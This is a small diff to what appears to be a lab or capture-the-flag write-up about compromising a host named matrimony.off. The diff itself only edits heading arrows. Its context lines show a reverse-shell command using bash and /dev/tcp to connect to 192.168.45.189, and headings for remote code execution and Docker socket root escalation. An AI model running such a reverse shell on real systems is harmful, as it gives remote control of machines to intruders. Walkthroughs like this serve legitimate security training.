@@ -48,7 +48,7 @@ matrimony.off.          604800  IN      SOA     matrimony.off. root.matrimony.of
 
 It also finds another subdomain at `prod99`.&#x20;
 
-### Matrimonial Website --> RCE
+### Matrimonial Website -> RCE
 
 The `prod99` domain shows us this marriage website:
 
@@ -115,7 +115,7 @@ $ bash -c 'bash -i >& /dev/tcp/192.168.45.189/21 0>&1'
 
 ## Privilege Escalation
 
-### Docker.Sock --> Root
+### Docker.Sock -> Root
 
 If we check `ifconfig`, we can find some Docker instanceis running since the IP of this machine is 172.17.0.1:
 
